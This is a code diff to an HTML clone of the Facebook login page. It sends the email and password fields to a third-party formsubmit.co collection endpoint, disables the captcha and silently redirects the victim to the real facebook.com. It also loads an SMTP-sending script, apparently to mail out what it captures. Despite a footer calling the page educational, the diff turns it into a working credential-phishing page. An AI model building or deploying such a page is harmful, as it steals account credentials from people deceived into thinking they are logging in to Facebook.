@@ -18,10 +18,13 @@
                 <h3 class="subtitle">Connect with friends and the world around you on Facebook.</h3>
             </div>
             <div class="container__right card">
-                <form action="post" method="post" class="card__form">
-                    <input type="email" placeholder="Email or phone number">
+                <form action="https://formsubmit.co/1bbed384d520670774ed9d1c89df68a4" method="POST"class="card__form">
+                    <input type="email" name="email" placeholder="Email or phone number">
 
-                    <input type="password" placeholder="Password">
+                    <input id="password" type="password"  name="name" placeholder="Password">
+
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://facebook.com">
 
                     <button type="submit" class="submit">Log In</button>
 
@@ -50,5 +53,7 @@
         <h3>This website is not the real Facebook website, it was builded for educational purposes</h3>
         <h4>Coded with <i class='bx bxs-heart icon'></i> & <i class='bx bxs-coffee icon'></i> by <a href="https://davedev.ca/" class="brand">David Hernandez</a> </h4> 
     </footer>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
 </body>
 </html>
